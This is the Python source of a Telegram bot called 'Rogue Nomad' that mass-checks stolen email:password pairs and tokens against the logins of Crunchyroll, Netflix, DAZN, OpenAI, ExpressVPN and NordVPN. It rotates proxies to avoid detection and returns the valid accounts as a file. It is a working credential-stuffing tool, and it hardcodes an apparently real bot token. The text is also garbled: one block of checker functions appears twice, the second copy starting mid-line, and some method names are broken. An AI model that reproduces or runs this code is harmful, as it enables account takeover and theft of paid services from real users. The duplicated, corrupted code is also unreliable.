#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
ROGUE NOMAD - Premium Checker Bot
Web Service Version for Render Free Tier
"""

import os
import asyncio
import logging
import json
import re
import io
import random
import time
import threading
from datetime import datetime
from typing import Dict, List, Optional, Any
from contextlib import asynccontextmanager

from flask import Flask, request, jsonify
from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
from telegram.ext import Application, CommandHandler, CallbackQueryHandler, MessageHandler, filters, ContextTypes
from telegram.constants import ParseMode
import aiohttp
import aiosqlite

# ============================================
# CONFIGURATION - YOUR CREDENTIALS
# ============================================
BOT_TOKEN = "8279300523:AAGC71G8Dd9QmmF2Yhn6MUSTKq7i-4q6p7w"
ADMIN_ID = 1875307475
DATABASE_URL = "rogue_nomad.db"
LOG_LEVEL = "INFO"
BOT_LINK = "https://t.me/+ckfO94UHyhllODg0"
BOT_USERNAME = "@roguenomad_bot"
BOT_NAME = "Rogue Nomad"
BOT_VERSION = "v3.0"
PORT = int(os.environ.get("PORT", 10000))

# ============================================
# LOGGING SETUP
# ============================================
logging.basicConfig(
    format="%(asctime)s - %(name)s - %(levelname)s - %(message)s",
    datefmt="%d-%b-%Y %H:%M:%S",
    level=logging.INFO
)
logger = logging.getLogger(name)

# ============================================
# DATABASE INITIALIZATION
# ============================================
INIT_DB = """
CREATE TABLE IF NOT EXISTS proxies (
    id INTEGER PRIMARY KEY AUTOINCREMENT,
    proxy TEXT UNIQUE NOT NULL,
    score INTEGER DEFAULT 100,
    failures INTEGER DEFAULT 0,
    alive BOOLEAN DEFAULT 1,
    last_used TIMESTAMP,
    created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP
);

CREATE TABLE IF NOT EXISTS checks (
    id INTEGER PRIMARY KEY AUTOINCREMENT,
    user_id INTEGER NOT NULL,
    chat_id INTEGER NOT NULL,
    service TEXT NOT NULL,
    credential TEXT NOT NULL,
    valid BOOLEAN DEFAULT 0,
    status TEXT,
    data TEXT,
    proxy_used TEXT,
    created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP
);

CREATE TABLE IF NOT EXISTS user_stats (
    user_id INTEGER PRIMARY KEY,
    total_checks INTEGER DEFAULT 0,
    total_valid INTEGER DEFAULT 0,
    last_active TIMESTAMP DEFAULT CURRENT_TIMESTAMP
);

CREATE TABLE IF NOT EXISTS global_stats (
    id INTEGER PRIMARY KEY,
    service TEXT NOT NULL,
    total INTEGER DEFAULT 0,
    valid INTEGER DEFAULT 0,
    updated_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP
);

CREATE TABLE IF NOT EXISTS users (
    user_id INTEGER PRIMARY KEY,
    username TEXT,
    first_name TEXT,
    joined_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
    last_active TIMESTAMP DEFAULT CURRENT_TIMESTAMP
);

CREATE INDEX IF NOT EXISTS idx_checks_user ON checks(user_id);
CREATE INDEX IF NOT EXISTS idx_checks_service ON checks(service);
CREATE INDEX IF NOT EXISTS idx_checks_created ON checks(created_at);
CREATE INDEX IF NOT EXISTS idx_proxy_alive ON proxies(alive);
CREATE INDEX IF NOT EXISTS idx_proxy_score ON proxies(score);
"""

@asynccontextmanager
async def get_db():
    async with aiosqlite.connect(DATABASE_URL) as db:
        await db.execute(INIT_DB)
        await db.commit()
        yield db

# ============================================
# PROXY MANAGER
# ============================================
class ProxyManager:
    def init(self):
        self._cache = []
        self._cache_time = 0
        self._cache_ttl = 60
    
    async def get_working_proxies(self) -> List[str]:
        if time.time() - self._cache_time < self._cache_ttl and self._cache:
            return self._cache
        
        async with get_db() as db:
            cursor = await db.execute(
                "SELECT proxy FROM proxies WHERE alive = 1 ORDER BY score DESC LIMIT 500"
            )
            rows = await cursor.fetchall()
            self._cache = [row[0] for row in rows]
            self._cache_time = time.time()
            return self._cache
    
    async def get_proxy(self) -> Optional[str]:
        proxies = await self.get_working_proxies()
        if not proxies:
            return None
        return random.choice(proxies)
    
    async def add_proxy(self, proxy: str) -> bool:
        proxy = proxy.replace("http://", "").replace("https://", "").strip()
        if not proxy or ":" not in proxy:
            return False
        
        parts = proxy.split(":")
        if len(parts) not in [2, 4]:
            return False
        
        try:
            async with get_db() as db:
                await db.execute(
                    "INSERT OR IGNORE INTO proxies (proxy) VALUES (?)",
                    (proxy,)
                )
                await db.commit()
                self._cache = []
                return True
        except Exception as e:
            logger.error(f"Error adding proxy {proxy}: {e}")
            return False
    
    async def add_proxies_from_text(self, content: str) -> int:
        added = 0
        for line in content.strip().split("\n"):
            line = line.strip()
            if line and not line.startswith("#"):
                if await self.add_proxy(line):
                    added += 1
        return added
    
    async def report_result(self, proxy: str, success: bool):
        if not proxy:
            return
        
        async with get_db() as db:
            if success:
                await db.execute(
                    "UPDATE proxies SET score = MIN(100, score + 5), failures = 0 WHERE proxy = ?",
                    (proxy,)
                )
            else:
                await db.execute(
                    "UPDATE proxies SET score = MAX(0, score - 10), failures = failures + 1 WHERE proxy = ?",
                    (proxy,)
                )
                await db.execute(
                    "UPDATE proxies SET alive = 0 WHERE proxy = ? AND failures >= 3",
                    (proxy,)
                )
            await db.commit()
            self._cache = []
    
    async def get_stats(self) -> Dict:
        async with get_db() as db:
            total = await db.execute_fetchall("SELECT COUNT(*) FROM proxies")
            alive = await db.execute_fetchall("SELECT COUNT(*) FROM proxies WHERE alive = 1")
            return {
                "total": total[0][0] if total else 0,
                "alive": alive[0][0] if alive else 0
            }

# ============================================
# SERVICE CHECKERS
# ============================================
class ServiceCheckers:
    @staticmethod
    async def check_crunchyroll(email: str, password: str, proxy: Optional[str] = None) -> Dict:
        try:
            async with aiohttp.ClientSession() as session:
                async with session.get(
                    "https://www.crunchyroll.com/",
                    proxy=proxy,
                    timeout=aiohttp.ClientTimeout(total=10)
                ) as resp:
                    html = await resp.text()
                    csrf_match = re.search(r'csrf_token["\s:]+"([^"]+)"', html)
                    csrf = csrf_match.group(1) if csrf_match else ""
                
                async with session.post(
                    "https://www.crunchyroll.com/login",
                    data={"email": email, "password": password, "csrf_token": csrf},
                    proxy=proxy,
                    allow_redirects=False,
                    timeout=aiohttp.ClientTimeout(total=10)
                ) as resp:
                    if resp.status == 302:
                        return {"valid": True, "status": "active", "tier": "premium"}
                    return {"valid": False, "status": "invalid"}
        except Exception as e:
            return {"valid": False, "status": "error", "error": str(e)}
    
    @staticmethod
    async def check_netflix_token(token: str, proxy: Optional[str] = None) -> Dict:
        try:
            async with aiohttp.ClientSession() as session:
                headers = {
    "Authorization": f"Bearer {token}",
    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"
                }
                async with session.get(
                    "https://www.netflix.com/api/shakti/viper/metadata",
                    headers=headers,
                    proxy=proxy,
                    timeout=aiohttp.ClientTimeout(total=10)
                ) as resp:
                    if resp.status == 200:
                        return {"valid": True, "status": "active"}
                    return {"valid": False, "status": "expired"}
        except:
            return {"valid": False, "status": "error"}
    
    @staticmethod
    async def check_dazn(email: str, password: str, proxy: Optional[str] = None) -> Dict:
        try:
            async with aiohttp.ClientSession() as session:
                async with session.post(
                    "https://login.dazn.com/v1/auth/login",
                    json={"email": email, "password": password},
                    proxy=proxy,
                    timeout=aiohttp.ClientTimeout(total=10)
                ) as resp:
                    if resp.status == 200:
                        data = await resp.json()
                        return {"valid": True, "status": "active", "region": data.get("region", "Unknown")}
                    return {"valid": False, "status": "invalid"}
        except:
            return {"valid": False, "status": "error"}
    
    @staticmethod
    async def check_openai_token(token: str, proxy: Optional[str] = None) -> Dict:
        try:
            async with aiohttp.ClientSession() as session:
                headers = {"Authorization": f"Bearer {token}"}
                async with session.get(
                    "https://api.openai.com/v1/models",
                    headers=headers,
                    proxy=proxy,
                    timeout=aiohttp.ClientTimeout(total=10)
                ) as resp:
                    if resp.status == 200:
                        return {"valid": True, "status": "active", "tier": "paid"}
                    return {"valid": False, "status": "invalid"}
        except:
            return {"valid": False, "status": "error"}
    
    @staticmethod
    async def check_expressvpn(email: str, password: str, proxy: Optional[str] = None) -> Dict:
        try:
            async with aiohttp.ClientSession() as session:
                async with session.post(
                    "https://www.expressvpn.com/api/v1/auth/login",
                    json={"email": email, "password": password},
                    proxy=proxy,
                    timeout=aiohttp.ClientTimeout(total=10)
                ) as resp:
                    if resp.status == 200:
                        data = await resp.json()
                        return {"valid": True, "status": "active", "plan": data.get("plan", "Unknown")}
                    return {"valid": False, "status": "invalid"}
        except:
            return {"valid": False, "status": "error"}
    
    @staticmethod
    async def check_nordvpn(email: str, password: str, proxy: Optional[str] = None) -> Dict:
        try:
            async with aiohttp.ClientSession() as session:
                async with session.post(
                    "https://api.nordvpn.com/v1/users/login",
                    json={"email": email, "password": password},
                    proxy=proxy,
                    timeout=aiohttp.ClientTimeout(total=10)
                ) as resp:
                    if resp.status == 200:
                        return {"valid": True, "status": "active"}
                    return {"valid": False, "status": "invalid"}
        except:
            return {"valid": False, "status": "error"}

# ============================================
# CHECKER ENGINE
# ============================================
class CheckerEngine:
    def init(self, proxy_manager: ProxyManager):
        self.proxy_manager = proxy_manager
        self.services = {
            "crunchyroll": {"checker": ServiceCheckers.check_crunchyroll, "type": "email:pass", "label": "🍿 Crunchyroll"},
            "netflix": {"checker": ServiceCheckers.check_netflix_token, "type"
                    "Authorization": f"Bearer {token}",
                    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"
                       }
                async with session.get(
                    "https://www.netflix.com/api/shakti/viper/metadata",
                    headers=headers,
                    proxy=proxy,
                    timeout=aiohttp.ClientTimeout(total=10)
                ) as resp:
                    if resp.status == 200:
                        return {"valid": True, "status": "active"}
                    return {"valid": False, "status": "expired"}
        except:
            return {"valid": False, "status": "error"}
    
    @staticmethod
    async def check_dazn(email: str, password: str, proxy: Optional[str] = None) -> Dict:
        try:
            async with aiohttp.ClientSession() as session:
                async with session.post(
                    "https://login.dazn.com/v1/auth/login",
                    json={"email": email, "password": password},
                    proxy=proxy,
                    timeout=aiohttp.ClientTimeout(total=10)
                ) as resp:
                    if resp.status == 200:
                        data = await resp.json()
                        return {"valid": True, "status": "active", "region": data.get("region", "Unknown")}
                    return {"valid": False, "status": "invalid"}
        except:
            return {"valid": False, "status": "error"}
    
    @staticmethod
    async def check_openai_token(token: str, proxy: Optional[str] = None) -> Dict:
        try:
            async with aiohttp.ClientSession() as session:
                headers = {"Authorization": f"Bearer {token}"}
                async with session.get(
                    "https://api.openai.com/v1/models",
                    headers=headers,
                    proxy=proxy,
                    timeout=aiohttp.ClientTimeout(total=10)
                ) as resp:
                    if resp.status == 200:
                        return {"valid": True, "status": "active", "tier": "paid"}
                    return {"valid": False, "status": "invalid"}
        except:
            return {"valid": False, "status": "error"}
    
    @staticmethod
    async def check_expressvpn(email: str, password: str, proxy: Optional[str] = None) -> Dict:
        try:
            async with aiohttp.ClientSession() as session:
                async with session.post(
                    "https://www.expressvpn.com/api/v1/auth/login",
                    json={"email": email, "password": password},
                    proxy=proxy,
                    timeout=aiohttp.ClientTimeout(total=10)
                ) as resp:
                    if resp.status == 200:
                        data = await resp.json()
                        return {"valid": True, "status": "active", "plan": data.get("plan", "Unknown")}
                    return {"valid": False, "status": "invalid"}
        except:
            return {"valid": False, "status": "error"}
    
    @staticmethod
    async def check_nordvpn(email: str, password: str, proxy: Optional[str] = None) -> Dict:
        try:
            async with aiohttp.ClientSession() as session:
                async with session.post(
                    "https://api.nordvpn.com/v1/users/login",
                    json={"email": email, "password": password},
                    proxy=proxy,
                    timeout=aiohttp.ClientTimeout(total=10)
                ) as resp:
                    if resp.status == 200:
                        return {"valid": True, "status": "active"}
                    return {"valid": False, "status": "invalid"}
        except:
            return {"valid": False, "status": "error"}

# ============================================
# CHECKER ENGINE
# ============================================
class CheckerEngine:
    def __init__(self, proxy_manager: ProxyManager):
        self.proxy_manager = proxy_manager
        self.services = {
            "crunchyroll": {"checker": ServiceCheckers.check_crunchyroll, "type": "email:pass", "label": "🍿 Crunchyroll"},
            "netflix": {"checker": ServiceCheckers.check_netflix_token, "type": "token", "label": "📺 Netflix"},
            "dazn": {"checker": ServiceCheckers.check_dazn, "type": "email:pass", "label": "⚽ DAZN"},
            "openai": {"checker": ServiceCheckers.check_openai_token, "type": "token", "label": "🧠 OpenAI"},
            "expressvpn": {"checker": ServiceCheckers.check_expressvpn, "type": "email:pass", "label": "🔒 ExpressVPN"},
            "nordvpn": {"checker": ServiceCheckers.check_nordvpn, "type": "email:pass", "label": "🔐 NordVPN"},
        }
        self.semaphore = asyncio.Semaphore(30)
        self.stats = {"total": 0, "valid": 0, "invalid": 0, "errors": 0, "by_service": {}}
    
    def _parse_credential(self, cred: str) -> Dict:
        cred = cred.strip()
        if ":" in cred and "@" in cred:
            parts = cred.split(":", 1)
            return {"email": parts[0].strip(), "password": parts[1].strip()}
        elif cred.startswith("ey") or len(cred) > 30:
            return {"token": cred}
        else:
            return {"raw": cred}
    
    async def check_single(self, service: str, credential: str, use_proxy: bool = True, user_id: int = 0, chat_id: int = 0) -> Dict:
        async with self.semaphore:
            proxy = await self.proxy_manager.get_proxy() if use_proxy else None
            service_info = self.services.get(service)
            if not service_info:
                return {"valid": False, "status": "unknown_service"}
            
            checker = service_info["checker"]
            parsed = self._parse_credential(credential)
            
            try:
                result = await checker(**parsed, proxy=proxy)
                if proxy:
                    await self.proxy_manager.report_result(proxy, result.get("valid", False))
                self._update_stats(service, result.get("valid", False))
                await self._log_check(user_id, chat_id, service, credential[:50], result.get("valid", False), result.get("status", "unknown"), json.dumps(result), proxy)
                result["proxy_used"] = proxy
                return result
            except Exception as e:
                self.stats["errors"] += 1
                await self._log_check(user_id, chat_id, service, credential[:50], False, "error", json.dumps({"error": str(e)}), proxy)
                return {"valid": False, "status": "error", "error": str(e)}
    
    async def check_batch(self, service: str, credentials: List[str], use_proxy: bool = True, user_id: int = 0, chat_id: int = 0, max_workers: int = 20) -> List[Dict]:
        sem = asyncio.Semaphore(max_workers)
        async def limited_check(cred):
            async with sem:
                return await self.check_single(service, cred, use_proxy, user_id, chat_id)
        
        tasks = [limited_check(cred) for cred in credentials]
        results = await asyncio.gather(*tasks, return_exceptions=True)
        processed = []
        for r in results:
            if isinstance(r, Exception):
                processed.append({"valid": False, "status": "error", "error": str(r)})
            else:
                processed.append(r)
        return processed
    
    async def _log_check(self, user_id, chat_id, service, credential, valid, status, data, proxy):
        try:
            async with get_db() as db:
                await db.execute(
                    "INSERT INTO checks (user_id, chat_id, service, credential, valid, status, data, proxy_used) VALUES (?, ?, ?, ?, ?, ?, ?, ?)",
                    (user_id, chat_id, service, credential, valid, status, data, proxy or "")
                )
                await db.execute(
                    "INSERT OR REPLACE INTO users (user_id) VALUES (?)",
                    (user_id,)
                )
                await db.commit()
        except Exception as e:
            logger.error(f"Failed to log check: {e}")
    
    def _update_stats(self, service: str, valid: bool):
        self.stats["total"] += 1
        if valid:
            self.stats["valid"] += 1
        else:
            self.stats["invalid"] += 1
        if service not in self.stats["by_service"]:
            self.stats["by_service"][service] = {"total": 0, "valid": 0}
        self.stats["by_service"][service]["total"] += 1
        if valid:
            self.stats["by_service"][service]["valid"] += 1
    
    def get_stats(self) -> Dict:
        return self.stats

# ============================================
# TELEGRAM BOT - INITIALIZE
# ============================================
proxy_manager = ProxyManager()
checker_engine = CheckerEngine(proxy_manager)

SERVICE_CATEGORIES = {
    "📺 Streaming": {
        "crunchyroll": "🍿 Crunchyroll",
        "netflix": "📺 Netflix",
        "dazn": "⚽ DAZN",
    },
    "🔒 VPN / Proxy": {
        "expressvpn": "🔒 ExpressVPN",
        "nordvpn": "🔐 NordVPN",
    },
    "🧠 AI": {
        "openai": "🧠 OpenAI",
    }
}

# ============================================
# COMMAND HANDLERS
# ============================================
async def start_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user = update.effective_user
    welcome_text = f"""
🔥 *{BOT_NAME} {BOT_VERSION}*

Welcome, {user.first_name or "Butter"}!

*What I can do:*
• Check credentials for streaming/VPN/AI services
• Batch check with file upload
• Proxy rotation for anonymity

*How to use:*
1. Use /checkers to see all services
2. Select a service
3. Send credentials (one per line)

*Join our community:*
🔗 {BOT_LINK}

*Commands:*
/checkers - Show all checkers
/proxy - Proxy management
/stats - Show statistics
/help - Help menu
/about - About Rogue Nomad
"""
    
    keyboard = [
        [InlineKeyboardButton("🎯 Start Checking", callback_data="checkers")],
        [InlineKeyboardButton("📊 Statistics", callback_data="show_stats")],
        [InlineKeyboardButton("🔗 Join Community", url=BOT_LINK)]
    ]
    
    await update.message.reply_text(
        welcome_text,
        reply_markup=InlineKeyboardMarkup(keyboard),
        parse_mode=ParseMode.MARKDOWN
    )

async def checkers_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    keyboard = []
    for category, services in SERVICE_CATEGORIES.items():
        keyboard.append([InlineKeyboardButton(category, callback_data=f"cat_{category}")])
    
    keyboard.append([InlineKeyboardButton("📊 Stats", callback_data="show_stats")])
    keyboard.append([InlineKeyboardButton("🔙 Back", callback_data="back_start")])
    
    await update.message.reply_text(
        "🎯 *Select a category:*",
        reply_markup=InlineKeyboardMarkup(keyboard),
        parse_mode=ParseMode.MARKDOWN
    )

async def handle_category(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()
    
    category = query.data.replace("cat_", "")
    services = SERVICE_CATEGORIES.get(category, {})
    
    keyboard = []
    for key, label in services.items():
        keyboard.append([InlineKeyboardButton(label, callback_data=f"svc_{key}")])
    
    keyboard.append([InlineKeyboardButton("🔙 Back", callback_data="checkers")])
    
    await query.edit_message_text(
        f"📋 *{category} Services*\nSelect a service:",
        reply_markup=InlineKeyboardMarkup(keyboard),
        parse_mode=ParseMode.MARKDOWN
    )

async def handle_service_selection(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()
    
    service = query.data.replace("svc_", "")
    context.user_data["check_service"] = service
    context.user_data["waiting_for_creds"] = True
    context.user_data["use_proxy"] = True
    
    service_info = checker_engine.services.get(service, {})
    label = service_info.get("label", service)
    cred_type = service_info.get("type", "email:pass or token")
    
    await query.edit_message_text(
        f"🔍 *Checking {label}*\n\n"
        f"Send credentials (one per line):\n"
        f"• {cred_type}\n"
        f"• Or upload a .txt file\n\n"
        f"🌐 Proxy: {'✅ ON' if context.user_data.get('use_proxy', True) else '❌ OFF'}",
        parse_mode=ParseMode.MARKDOWN,
        reply_markup=InlineKeyboardMarkup([
            [InlineKeyboardButton(
                f"🌐 Toggle Proxy {'✅' if context.user_data.get('use_proxy', True) else '❌'}",
                callback_data="toggle_proxy"
            )],
            [InlineKeyboardButton("🔙 Back", callback_data="checkers")]
        ])
    )

async def toggle_proxy_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()
    
    current = context.user_data.get("use_proxy", True)
    context.user_data["use_proxy"] = not current
    
    await query.edit_message_reply_markup(
        reply_markup=InlineKeyboardMarkup([
            [InlineKeyboardButton(
                f"🌐 Toggle Proxy {'✅' if context.user_data['use_proxy'] else '❌'}",
                callback_data="toggle_proxy"
            )],
            [InlineKeyboardButton("🔙 Back", callback_data="checkers")]
        ])
    )

async def handle_message(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not context.user_data.get("waiting_for_creds"):
        return
    
    service = context.user_data.get("check_service")
    if not service:
        await update.message.reply_text("❌ No service selected. Use /checkers first.")
        return
    
    if update.message.document:
        file = await update.message.document.get_file()
        content = await file.download_as_bytearray()
        credentials = content.decode("utf-8").strip().split("\n")
    else:
        credentials = update.message.text.strip().split("\n")
    
    credentials = [c.strip() for c in credentials if c.strip()]
    if not credentials:
        await update.message.reply_text("❌ No credentials provided.")
        return
    
    status_msg = await update.message.reply_text(
        f"⏳ Checking {len(credentials)} credentials...",
        parse_mode=ParseMode.MARKDOWN
    )
    
    user_id = update.effective_user.id
    chat_id = update.effective_chat.id
    use_proxy = context.user_data.get("use_proxy", True)
    
    results = await checker_engine.check_batch(service, credentials, use_proxy, user_id, chat_id)
    
    valid = [r for r in results if r.get("valid")]
    invalid = [r for r in results if not r.get("valid")]
    
    if valid:
        output_lines = []
        for i, r in enumerate(valid):
            cred = credentials[i] if i < len(credentials) else "unknown"
            output_lines.append(f"{cred} | {r.get('status', 'active')}")
        output = "\n".join(output_lines)
        output_file = io.StringIO(output)
        output_file.name = f"valid_{service}_{datetime.now().strftime('%Y%m%d_%H%M%S')}.txt"
        
        await update.message.reply_document(
            document=output_file,
            filename=output_file.name,
            caption=f"✅ {len(valid)} valid credentials found."
        )
    
    summary = f"""
📊 *Check Complete*
Service: {service}
Total: {len(results)}
✅ Valid: {len(valid)}
❌ Invalid: {len(invalid)}
"""
    await update.message.reply_text(summary, parse_mode=ParseMode.MARKDOWN)
    await status_msg.delete()
    context.user_data["waiting_for_creds"] = False

async def admin_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if update.effective_user.id != ADMIN_ID:
        await update.message.reply_text("❌ Unauthorized.")
        return
    
    keyboard = [
        [InlineKeyboardButton("📊 Full Stats", callback_data="admin_stats")],
        [InlineKeyboardButton("📢 Broadcast", callback_data="admin_broadcast")],
        [InlineKeyboardButton("🔄 Reset Stats", callback_data="admin_reset")],
        [InlineKeyboardButton("🔙 Back", callback_data="back_start")]
    ]
    
    await update.message.reply_text(
        "🔐 *Admin Panel*",
        reply_markup=InlineKeyboardMarkup(keyboard),
        parse_mode=ParseMode.MARKDOWN
    )

async def broadcast_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if update.effective_user.id != ADMIN_ID:
        await update.message.reply_text("❌ Unauthorized.")
        return
    
    if not context.args:
        await update.message.reply_text("📢 Usage: /broadcast <message>")
        return
    
    message = " ".join(context.args)
    
    async with get_db() as db:
        cursor = await db.execute("SELECT user_id FROM users")
        users = await cursor.fetchall()
    
    sent = 0
    for user in users:
        try:
            await context.bot.send_message(
                chat_id=user[0],
                text=f"📢 *Broadcast from Admin*\n\n{message}",
                parse_mode=ParseMode.MARKDOWN
            )
            sent += 1
            await asyncio.sleep(0.05)
        except:
            pass
    
    await update.message.reply_text(f"✅ Broadcast sent to {sent} users.")

async def reset_stats_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if update.effective_user.id != ADMIN_ID:
        await update.message.reply_text("❌ Unauthorized.")
        return
    
    checker_engine.stats = {"total": 0, "valid": 0, "invalid": 0, "errors": 0, "by_service": {}}
    
    async with get_db() as db:
        await db.execute("DELETE FROM checks")
        await db.execute("DELETE FROM user_stats")
        await db.execute("DELETE FROM global_stats")
        await db.commit()
    
    await update.message.reply_text("✅ Statistics reset.")

async def back_to_start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()
    
    keyboard = [
        [InlineKeyboardButton("🎯 Start Checking", callback_data="checkers")],
        [InlineKeyboardButton("📊 Statistics", callback_data="show_stats")],
        [InlineKeyboardButton("🔗 Join Community", url=BOT_LINK)]
    ]
    
    await query.edit_message_text(
        f"🔥 *{BOT_NAME} {BOT_VERSION}*\n\nWelcome back!",
        reply_markup=InlineKeyboardMarkup(keyboard),
        parse_mode=ParseMode.MARKDOWN
    )

async def show_stats_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()
    
    stats = checker_engine.get_stats()
    proxy_stats = await proxy_manager.get_stats()
    
    text = f"""
📊 *Statistics*
Total: {stats['total']}
✅ Valid: {stats['valid']}
❌ Invalid: {stats['invalid']}
🌐 Proxies: {proxy_stats['alive']}/{proxy_stats['total']}
"""
    await query.edit_message_text(
        text,
        parse_mode=ParseMode.MARKDOWN,
        reply_markup=InlineKeyboardMarkup([
            [InlineKeyboardButton("🔙 Back", callback_data="checkers")]
        ])
    )

# ============================================
# FLASK APP FOR RENDER WEB SERVICE
# ============================================
flask_app = Flask(name)

@flask_app.route('/')
def health():
    return f"{BOT_NAME} is running!", 200

@flask_app.route('/health')
def health_check():
    return {"status": "ok", "bot": BOT_NAME, "version": BOT_VERSION}, 200

def run_flask():
    port = int(os.environ.get('PORT', 10000))
    logger.info(f"🌐 Flask server starting on port {port}")
    flask_app.run(host='0.0.0.0', port=port, debug=False, use_reloader=False)

# ============================================
# MAIN FUNCTION
# ============================================
def main():
    if not BOT_TOKEN or BOT_TOKEN == "YOUR_BOT_TOKEN_HERE":
        logger.error("❌ BOT_TOKEN not set!")
        return
    
    app = Application.builder().token(BOT_TOKEN).build()
    
    app.add_handler(CommandHandler("start", start_command))
    app.add_handler(CommandHandler("checkers", checkers_command))
    app.add_handler(CommandHandler("admin", admin_command))
    app.add_handler(CommandHandler("broadcast", broadcast_command))
    app.add_handler(CommandHandler("resetstats", reset_stats_command))
    app.add_handler(CommandHandler("help", start_command))
    app.add_handler(CommandHandler("about", start_command))
    
    app.add_handler(CallbackQueryHandler(handle_category, pattern="^cat_"))
    app.add_handler(CallbackQueryHandler(handle_service_selection, pattern="^svc_"))
    app.add_handler(CallbackQueryHandler(toggle_proxy_callback, pattern="^toggle_proxy"))
    app.add_handler(CallbackQueryHandler(show_stats_callback, pattern="^show_stats"))
    app.add_handler(CallbackQueryHandler(back_to_start, pattern="^back_start"))
    app.add_handler(CallbackQueryHandler(checkers_command, pattern="^checkers$"))
    
    app.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, handle_message))
    app.add_handler(MessageHandler(filters.Document.ALL, handle_message))
    
    logger.info(f"🚀 {BOT_NAME} {BOT_VERSION} is LIVE!")
    logger.info(f"📱 Bot: {BOT_USERNAME}")
    logger.info(f"🔗 Channel: {BOT_LINK}")
    
    app.run_polling(allowed_updates=Update.ALL_TYPES)

if name == "main":
    flask_thread = threading.Thread(target=run_flask, daemon=True)
    flask_thread.start()
    time.sleep(2)
    main()
